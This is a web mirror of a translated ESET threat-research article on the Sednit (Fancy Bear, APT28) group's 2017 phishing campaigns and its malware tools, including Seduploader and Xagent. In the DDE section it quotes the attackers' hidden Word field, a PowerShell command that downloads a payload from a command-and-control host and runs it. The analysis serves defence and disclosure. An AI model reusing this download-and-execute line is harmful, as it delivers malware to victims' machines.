<!doctype html>
<html class="no-js" lang="en">

<head>
  <!-- Global site tag (gtag.js) - Google Analytics -->
  <script async src="https://www.googletagmanager.com/gtag/js?id=UA-134931760-1"></script>
  <script>
    window.dataLayer = window.dataLayer || [];
    function gtag(){dataLayer.push(arguments);}
    gtag('js', new Date());

    gtag('config', 'UA-134931760-1');
  </script>

  <meta charset="utf-8">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  <title>Year of the bear. How Fancy Bear Spent 2017 Year</title>
  <link rel="icon" type="image/x-icon" href="/favicon.ico" />
  <meta name="description" content="The Sednit cyber group, better known as Fancy Bear (Strontium, APT28, Sofacy), has been operating since at least 2004. Its main goal is the theft of c...">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

  <link rel="stylesheet" href="../../css/main.css">

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
  <script>window.jQuery || document.write('<script src="../../js/vendors/jquery-3.3.1.min.js"><\/script>')</script>

  <script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
  <script>
       (adsbygoogle = window.adsbygoogle || []).push({
            google_ad_client: "ca-pub-6974184241884155",
            enable_page_level_ads: true
       });
  </script>
</head>

<body>
  <!--[if lte IE 9]>
    <p class="browserupgrade">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience and security.</p>
  <![endif]-->
  <header class="page-header js-page-header">
    <a class="page-header-logo-container" href="https://weekly-geekly.github.io/index.html"></a>
    <div class="page-header-text">Geekly Articles each Day</div>
  </header>
  <nav class="page-headings-container js-page-headings-container"></nav>
  <div class="tools-bar js-tools-bar">
    <!-- <a href="../../search.html" title="Search">üîé</a> -->
    <a class="js-list-of-headings-button" data-state="closed" href="#" title="Headings">üìú</a>
    <a class="js-go-to-top-button" href="#" title="Go to Top">‚¨ÜÔ∏è</a>
    <a class="js-go-to-bottom-button" href="#" title="Go to Bottom">‚¨áÔ∏è</a>
  </div>
  <a href="http://bit.ly/donateToWeeklyGeekly" class="donate-btn">DONATE</a>
  <section class="page js-page"><h1>Year of the bear. How Fancy Bear Spent 2017 Year</h1><div class="post__text post__text-html js-mediator-article">  The Sednit cyber group, better known as Fancy Bear (Strontium, APT28, Sofacy), has been operating since at least 2004.  Its main goal is the theft of confidential information from senior officials. <br><br><div style="text-align:center;"><img src="https://habrastorage.org/webt/on/y6/ri/ony6ri76gylefcfvhgunpgvsej4.jpeg"></div><br>  The article summarizes the findings from the ESET presentation, voiced at the <a href="https://blogs.technet.microsoft.com/bluehat/2017/09/01/announcing-the-bluehat-v17-schedule/">BlueHat</a> conference in November 2017.  Earlier in 2016, we published a <a href="https://www.welivesecurity.com/wp-content/uploads/2016/10/eset-sednit-full.pdf">study</a> on the activities of Sednit from 2014 to 2016.  Since that time, we have continued to monitor the group's operations and today we present an overview of the main campaigns and updated tools.  In the first part of the report, we will discuss new ways to compromise target systems.  The second part is devoted to the evolution of tools, the focus of the flagship of the group is the Xagent malware. <br><br><a name="habracut"></a><h3>  Campaigns </h3><br>  In recent years, the Sednit team has used several methods to deliver malware to target computers.  Typically, an attack begins with a phishing email containing a malicious link or attachment.  However, the methods have changed over the course of the year.  If in the past the group most often used Sedkit, then since the end of 2016 the set of exploits has completely disappeared.  After the publication of our <a href="https://www.welivesecurity.com/wp-content/uploads/2016/10/eset-sednit-full.pdf">report, the</a> group switched to the <a href="https//researchcenter.paloaltonetworks.com/2016/10/unit42-dealerschoice-sofacys-flash-player-exploit-platform/">DealersChoice</a> platform, but we observed other vectors, including macros and Word DDE. 
      <br>
        <script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
        <ins class="adsbygoogle"
          style="display:block; text-align:center;"
          data-ad-layout="in-article"
          data-ad-format="fluid"
          data-ad-client="ca-pub-6974184241884155"
          data-ad-slot="8945601208"></ins>
        <script>
          (adsbygoogle = window.adsbygoogle || []).push({});
        </script>
      <br>
      The next three sections describe the methods that Sednit operators use to gain a foothold in the target system.  As a rule, attackers try to install the backdoor of the first stage of the Seduploader to examine the victim and download additional malware.  If the compromised system is of interest, the main backdoor Xagent is likely to be installed on it. <br><br>  <b>Sedkit (Sednit Exploit Kit)</b> <br><br>  Sedkit is an exploit kit used exclusively by Sednit.  During the period of activity, the group exploited vulnerabilities in various applications, mainly Adobe Flash and Internet Explorer. <br><br>  At the time of the <a href="https://habrahabr.ru/company/eset/blog/239979/">discovery of</a> Sedkit, potential victims were redirected to the landing page using a watering hole scheme.  The group then turned to the use of malicious links embedded in emails that are sent to potential victims.  The scheme of Sedkit work is presented below: <br><br><img src="https://habrastorage.org/webt/7s/tb/qy/7stbqymgvabxc2qtcndac-sh9ze.png"><br><br>  From August to September 2016, we observed several email campaigns designed to attract recipients to the Sedkit landing page.  At that time, the Sednit group was interested in employees of embassies and political parties in Central Europe.  The figure below shows an example of distribution: <br><br><img src="https://habrastorage.org/webt/km/k9/h-/kmk9h-0e7qixx2v4fgffqiyscag.png"><br><br>  The task of the letter is to convince the recipient to follow the link.  The addressee is offered to read the article about the earthquake near Rome in August 2016.  It is assumed that the source will seem reliable.  However, the letter contains at least two hints of a fake: spelling errors (for example, ‚ÄúGreetigs!‚Äù), Often found on the Sednit mailings, and the domain part of the URL.  This is a malicious domain, but part of the URL path imitates a real-life link to a legitimate source.  In this case, the URL is the same as in the Air Force home article. <br><br>  This is the usual tactic of Sednit - use popular articles and redirect target users who follow the link from the letter to the landing page of Sedkit, and after that to the legitimate site.  In addition to the Air Force, the group often uses news on The Huffington Post as bait. <br><br>  The letter below with a link to Sedkit demonstrates several interesting features: <br><br><img src="https://habrastorage.org/webt/d4/x3/il/d4x3il9e8k8vib_4wx9tjjysnic.png"><br><br>  Firstly, the subject of the letter and the URL are not combined - a letter about Syria and Aleppo, and the link leads to an article about WADA and ‚ÄúRussian hackers‚Äù.  Secondly, there are two spelling errors: the already mentioned ‚ÄúGreetigs!‚Äù And ‚ÄúUnated Nations‚Äù instead of ‚ÄúUnited Nations‚Äù.  We hope that the real employees of the UN PR department have signatures without errors. <br><br>  The last campaign using Sedkit was fixed in October 2016.  Interestingly, the disappearance of Sedkit corresponds to the trend that we have observed with other sets of exploits.  Most of the kits are based on exploits for older versions of Internet Explorer and / or Flash for drive-by download attacks.  The reduction in the number of transactions with them (including Sedkit) during 2016 may be related to Microsoft and Adobe measures to increase code protection. <br><br>  Details on the work of Sedkit are disclosed in the same <a href="https://www.welivesecurity.com/wp-content/uploads/2016/10/eset-sednit-full.pdf">report</a> . <br><br>  <b>DealersChoice</b> <br><br>  In August 2016, Palo Alto Networks published a <a href="https://researchcenter.paloaltonetworks.com/2016/10/unit42-dealerschoice-sofacys-flash-player-exploit-platform/">post</a> about a new platform used by Sednit for initial penetration into the system.  The platform, called DealersChoice, allows you to generate malicious documents with built-in Adobe Flash Player exploits. <br><br>  There are two options for the platform.  The first checks which version of Flash Player is installed on the system, and then selects one of the three vulnerabilities.  The second one first contacts the C &amp; C management server, which will deliver the selected exploit and the final payload.  Of course, the second option is more difficult to analyze, since the document delivered to the target system does not contain all the ‚Äúpuzzle pieces‚Äù. <br><br>  Currently, the Sednit group is still using the DealersChoice platform.  As in the scheme with Sedkit, the attackers track international news and include links to them in malicious messages.  Sometimes the group uses other schemes that are far from the policy.  In December 2016, a rather atypical bait was used: <br><br><img src="https://habrastorage.org/webt/xb/ht/wi/xbhtwidglmahyq_qifesofe9i6a.png"><br><img src="https://habrastorage.org/webt/z-/ok/8p/z-ok8plnd2pbhsrjpcufrztalv8.png"><br><br>  This letter was sent to the Ministries of Foreign Affairs and Embassies in Europe on December 22-23.  A Christmas card in Word format was attached to it.  For the first time, the Sednit group used a phishing email, the topic of which is not related to geopolitics.  Opening a document from an attachment initiates an attempt to compromise the system using DealersChoice. <br><br>  The Sednit group used DealersChoice intensively at the end of 2016, but then the platform disappeared from the radar for a long time - in 2017 we saw its use for the first time in October: <br><br><img src="https://habrastorage.org/webt/s4/tf/9n/s4tf9n1zsdsfee7il_xoxytihok.png"><br><br>  We do not have a sample letter used in this campaign, but on the basis of the bait document, we can assume that the target was government officials.  Other campaigns using DealersChoice have also been studied by security experts.  For example, the <a href="https://www.proofpoint.com/us/threat-insight/post/apt28-racing-exploit-cve-2017-11292-flash-vulnerability-patches-are-deployed">Proofpoint</a> report describes the addition of a new Adobe Flash Player vulnerability to the DealersChoice platform - this indicates the active use of the platform by the Sednit team and its continuous development. <br><br>  <b>Macros, VBA and DDE</b> <br><br>  In addition to Sedkit and DealersChoice, the Sednit group continues to use proven methods of compromising target systems ‚Äî using macros in Microsoft Office documents.  There are other methods.  One campaign, which attracted considerable attention, was aimed at the foreign ministries of Eastern European countries in April 2017.  The MFA officer received the following letter: <br><br><img src="https://habrastorage.org/webt/9u/ya/u4/9uyau42t_eaxqzakkoz6kqa0lg0.png"><br><br>  The attachment contained code that uses two 0-day vulnerabilities: local privilege escalation (LPE - local privilege escalation) and remote code execution (RCE - remote code execution).  We report vulnerabilities in Microsoft.  Campaign analysis can be found in our <a href="https://www.welivesecurity.com/2017/05/09/sednit-adds-two-zero-day-exploits-using-trumps-attack-syria-decoy/">blog</a> . <br><br>  The last example illustrates that the Sednit group is paying close attention to new security developments.  In early October 2017, researchers at <a href="https://sensepost.com/blog/2017/macro-less-code-exec-in-msword/">SensePost</a> published an article about the Dynamic Data Exchange Protocol (DDE).  DDE is a dynamic data exchange function between different applications, which allows, for example, updating a table in Word with data contained in an Excel document.  Conveniently, but at least with Word and Excel the protocol can be used to execute arbitrary code if the user ignores several warnings.  Shortly after the publication of the article, Sednit campaigns started using DDE to execute code from the C &amp; C server manager.  In these campaigns, documented by <a href="https://securingtomorrow.mcafee.com/mcafee-labs/apt28-threat-group-adopts-dde-technique-nyc-attack-theme-in-latest-campaign/">McAfee</a> , the decoy document is empty, but it contains a hidden field with the following code: <br><br>  DDE <br> <code>"C:\\Programs\\Microsoft\\Office\\MSWord.exe\\..\\..\\..\\..\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -NoP -sta -NonI -W Hidden $e=(New-Object System.Net.WebClient).DownloadString('http://sendmevideo.org/dh2025e/eee.txt');powershell -enc $e # " "a slow internet connection" "try again later"</code> <br> <br>  If the potential victim opens the document and ignores the warnings, this script will be executed, the Seduploader binary file is loaded from the C &amp; C server and executed on the target system. <br><br>  This is a brief overview of the compromise methods used by Sednit since the publication of our report.  As you can see, the group is as active as before, in the sphere of its interests - government agencies in different countries of the world. <br><br><h3>  Tools </h3><br>  The previous section shows how the Sednit group spent 2017 in terms of infection vectors.  Further we will tell about changes in toolkit.  Analysis of all components is in <a href="https://www.welivesecurity.com/wp-content/uploads/2016/10/eset-sednit-full.pdf">the</a> 2016 <a href="https://www.welivesecurity.com/wp-content/uploads/2016/10/eset-sednit-full.pdf">report</a> . <br><br>  Over the years, the group has created many tools for infecting, collecting and stealing information in target systems.  Some of them are decommissioned, some are refined. <br><br>  <b>Seduploader</b> <br><br>  Seduploader is used as an intelligence tool.  It consists of two separate components: the dropper and the constant payload that it installs. <br><br>  Seduploader is still used by the Sednit group, but has been refined.  During the April campaign in 2017, a version with new features appeared, including a screenshoter and the ability to load C &amp; C servers into memory.  We recently noticed that the dropper replaces the PowerShell commands that deliver the Seduploader payload. <br><br>  <b>Xtunnel</b> <br><br>  Xtunnel is a network proxy tool that can trace a network between a C &amp; C server on the Internet and a workstation on a local network.  Xtunnel is still used by the group. <br><br>  <b>Sedkit</b> <br><br>  Sedkit is a set of exploits for the Sednit group; it is used only in targeted attacks starting with targeted phishing messages with URL addresses that mimic legitimate ones.  The last time we saw the use of Sedkit in October 2016. <br><br>  <b>Sedreco</b> <br><br>  Sedreco is a backdoor used for espionage, its functionality can be enhanced with dynamically loaded plugins.  It consists of two separate components: the dropper and the constant payload that it installs.  We have not seen the operation of this component since April 2016. <br><br>  <b>USBStealer</b> <br><br>  USBStealer is used as a network tool to extract confidential information from systems isolated from the Internet.  We have not seen the operation of this component since mid-2015. <br><br>  <b>Xagent</b> <br><br>  Xagent is a modular backdoor with spyware features, including key logging and file exfiltration.  This is the flagship backdoor Sednit, it is widely used in group operations.  Early versions for Linux and Windows were discovered a few years ago, in 2015, an <a href="http://blog.trendmicro.com/trendlabs-security-intelligence/pawn-storm-update-ios-espionage-app-found">iOS</a> version appeared, a year later - for <a href="https://www.crowdstrike.com/blog/danger-close-fancy-bear-tracking-ukrainian-field-artillery-units">Android</a> , and in early 2017 - for <a href="https://labs.bitdefender.com/2017/02/new-xagent-mac-malware-linked-with-the-apt28">OS X.</a> <br><br>  In February 2017, we discovered a new version of Xagent for Windows.  Based on the following lines in the binary files, we concluded that this is the fourth version of the backdoor.  The various versions of the Xagent modules are listed in table 1. <br><br>  <i>Table 1. Xagent Versions</i> <br><img src="https://habrastorage.org/webt/jg/jm/a3/jgjma3e5snllrkzj12fdoqrrrbk.png"><br>  <i>* We cannot compare this module with previously known ones.</i> <br><br>  The fourth version of Xagent received new methods of obfuscation of lines, <a href="https://en.wikipedia.org/wiki/Run-time_type_information">RTTI</a> also obfustsirovana.  These methods significantly improve the encryption of strings; the method is unique for each binary file.  Previous versions of Xagent used to decrypt XOR.  A new encryption algorithm is a series of operations with values ‚Äã‚Äãthat are likely to be generated at the compilation stage.  The complexity of the code is illustrated in the figure below: <br><br><img src="https://habrastorage.org/webt/si/yx/9u/siyx9uhvkpa7ddgpbtnxsqdz_go.png"><br><br>  However, the HexRays decompiler can simplify it: <br> <code>return (((((a2 ^ (((((((((((a1 - 13 + 42) ^ 0x7B) + 104) ^ 0x72) - 81 - a2 ‚Äì <br> 76) ^ 0x31) + 75) ^ 0x3B) + 3) ^ 0x40) + 100) ^ 0x1C ^ 0xA9) + 41) ^ 0xB9) - <br> 65) ^ 0xA) % 256;</code> <br> <br>  AgentKernel can receive commands from the C &amp; C server to interact with modules and channels.  Some of the previously known commands were removed, several new ones appeared. <br><br>  Earlier versions supported commands 2, PING_REQUEST, removed in version four.  However, the operator can still get the list of modules with the GET_AGENT_INFO command.  Commands 34, 35 and 36 are similar to SET_PARAMETERS, which allows you to interact with <i>LocalStorage</i> , the kernel repository.  It contains file storage for communicating with the C &amp; C server and registry for storing various configuration parameters. <br><br>  The new feature implemented in the <i>WinHttp</i> channel is a domain generation algorithm (DGA) for backup domains.  <i>WinHttp</i> is the channel responsible for communicating with the C &amp; C server.  Unlike the usual DGA, which elicits an initial value from pseudo-random numbers, it receives a given number (possibly generated during compilation) for a given sample.  The way to generate a domain is as follows: <br><br>  - a set of operations is applied to the initial number <br>  - the result gives a deviation for three different arrays (by adding another seed number to each array) <br>  - after calculating the new deviation (deviation + initial number) the word is decoded <br>  - all words are connected (four words are used to generate a domain, the fourth word is from the first array, but with a different deviation) <br>  - ".com" is added <br><br>  Thanks to constant refinement and compatibility with major platforms, Xagent is the main backdoor of the Sednit group. <br><br>  <b>DealersChoice</b> <br><br>  DealersChoice is a platform that generates malicious documents containing embedded Adobe Flash files.  In Palo Alto Network, we studied two platform options: A - a standalone version with a Flash Player exploit code packed with payload, and B - a modular version that loads an exploit on demand.  A new component appeared in 2016 and is still in use. <br><br>  <b>Downdelph</b> <br><br>  Downdelph is a lightweight downloader written in Delphi.  As we mentioned earlier, it was active from November 2013 to September 2015, there were no new versions. <br><br><h3>  Conclusion </h3><br>  Sednit group is still active.  The main entry point to the target system - phishing emails, and it seems that this method is still effective.  In the center of operations - Xagent, there are versions for all popular operating systems, including mobile platforms.  The latest version of the backdoor is extremely interesting, the operators obviously worked a lot on it.  From the moment of detection, we observed in-the-wild two versions of Xagent: one with a channel and an unknown module, the second with all modules and a channel, but without an unknown module.  We can assume that the group has added another level of verification of targets - loading Xagent with several modules.  If the victim is of interest, she will receive another, fully functional version of the backdoor. <br><br><h3>  Indicators of compromise </h3><br>  <i>Table 2. Phishing</i> <br><br><img src="https://habrastorage.org/webt/iv/rd/dv/ivrddv_8zi6xpgkj24qcjau5v08.png"><br><br>  <i>Table 3. Seduploader Samples</i> <br><br><img src="https://habrastorage.org/webt/7f/ci/dw/7fcidwzlwjlcw4fn9r1hab6db8i.png"><br><br>  <i>Table 4. Xagent Samples</i> <br><br><img src="https://habrastorage.org/webt/vj/x0/on/vjx0on-b1yll7eihwisar2nkmzc.png"></div><p>Source: <a href="https://habr.com/ru/post/345260/">https://habr.com/ru/post/345260/</a></p>
<section class="more-articles-navigation-panel js-more-articles-navigation-panel">
<h4>More articles:</h4>
<nav class="list-of-articles-container js-list-of-articles-container"><ul class="list-of-pages js-list-of-pages">
<li><a href="../345250/index.html">We track Millenium Falcon with TensorFlow</a></li>
<li><a href="../345252/index.html">Lectures Tehnotreka. Android Development (Fall 2017)</a></li>
<li><a href="../345254/index.html">What salaries for IT specialists are offered by My Circle employers, data for May-October 2017</a></li>
<li><a href="../345256/index.html">‚ÄúVirtual University‚Äù: What VR-projects are being developed at ITMO University</a></li>
<li><a href="../345258/index.html">Telecommunications operators of the Russian Federation. 2017. Some Analytics</a></li>
<li><a href="../345262/index.html">How does it feel to create a game for Game Boy in 2017</a></li>
<li><a href="../345264/index.html">The effectiveness of advertising formats and networks in 2017: an analysis of 69 billion advertising hits</a></li>
<li><a href="../345266/index.html">Organization of musical accompaniment of the trading hall</a></li>
<li><a href="../345268/index.html">What to recognize on mobile platforms?</a></li>
<li><a href="../345270/index.html">Networks for the smallest. Part fourteen. Package path</a></li>
</ul></nav>
</section><br />
<a href="../../allArticles.html"><strong>All Articles</strong></a>
<script src="../../js/main.js"></script>

<!-- Yandex.Metrika counter -->
<script type="text/javascript" >
  (function (d, w, c) {
      (w[c] = w[c] || []).push(function() {
          try {
              w.yaCounter52496797 = new Ya.Metrika({
                  id:52496797,
                  clickmap:true,
                  trackLinks:true,
                  accurateTrackBounce:true,
                  webvisor:true
              });
          } catch(e) { }
      });

      var n = d.getElementsByTagName("script")[0],
          s = d.createElement("script"),
          f = function () { n.parentNode.insertBefore(s, n); };
      s.type = "text/javascript";
      s.async = true;
      s.src = "https://mc.yandex.ru/metrika/watch.js";

      if (w.opera == "[object Opera]") {
          d.addEventListener("DOMContentLoaded", f, false);
      } else { f(); }
  })(document, window, "yandex_metrika_callbacks");
</script>
<noscript><div><img src="https://mc.yandex.ru/watch/52496797" style="position:absolute; left:-9999px;" alt="" /></div></noscript>

<!-- Google Analytics -->
  <script>
    window.ga = function () { ga.q.push(arguments) }; ga.q = []; ga.l = +new Date;
    ga('create', 'UA-134931760-1', 'auto'); ga('send', 'pageview')
  </script>
  <script src="https://www.google-analytics.com/analytics.js" async defer></script>

</section>

  <footer class="page-footer">
    <div class="page-footer-legal-info-container page-footer-element">
      <p>
        Weekly-Geekly | <span class="page-footer-legal-info-year js-page-footer-legal-info-year">2019</span>
      </p>
    </div>
    <div class="page-footer-counters-container page-footer-element">
      <a class="page-footer-counter-clustrmap" href='#'  title='Visit tracker'><img src='https://clustrmaps.com/map_v2.png?cl=698e5a&w=271&t=t&d=6iCFw7uJz0zcOaoxz5k5PcLCJUzv2WG8G5V8M3U6Rc4&co=3a3a3a&ct=ffffff'/></a>
    </div>
  </footer>
</body>

</html>